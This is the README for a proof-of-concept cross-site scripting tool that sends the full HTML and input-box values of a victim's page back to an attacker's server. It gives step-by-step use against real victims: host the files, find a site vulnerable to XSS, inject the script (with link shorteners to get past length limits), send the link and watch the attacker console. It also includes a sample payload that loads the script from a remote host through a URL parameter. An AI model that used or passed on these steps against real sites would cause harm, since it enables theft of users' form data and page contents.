#XSS Screencapture

##Overview
This is a very simple, POC script and server-side pages that will send the entire HTML contents and values of input boxes back to an attacker. You must
host the files on a server. Then, simply inject the "injectme.js" script into any site vulnerable to XSS. Once the page is live (send the link to the
victim containing the XSS), open the console.html page and wait for updates.

##Usage
* Edit the injectme.js file and set "remote_post" to the full URL of where the POST page will reside on your server.
* Upload the console.html, injectme.js, page.html, and post.php files to your server.
* Find a site vulnerable to XSS. Use XSS to load the injectme.js script from your server (you can use link shorteners or host the injectme.js file on a
domain with few characters to overcome length restrictions).
* Next, open the console.html page.
* Wait for the victim to open the vulnerable page. When he or she does, the console will refresh with the live page contents and the contents of any input boxes.

##Testing
I have created a test.php file to demonstrate this script. Load the page like so: ```http://site.com/test.php?a=<script src="http://site.com/injectme.js"></script>```

##Limitations
* Single-user only - if multiple users open the vulnerable page, the sessions will be mixed.
* Doesn't get user-supplied data in non-input elements (i.e. textareas, select boxes, etc.)

##File Contents
* injectme.js - the script to inject as part of the XSS payload
* page.html - a blank HTML file that the server will write to when the victim clicks the link. Do not edit this page.
* post.php - the server side file that receives the POST from the victim and writes the HTML to page.html
* console.html - the page the attacker uses to monitor changes made to the victim's page
* test.php - a sample victim page vulnerable to XSS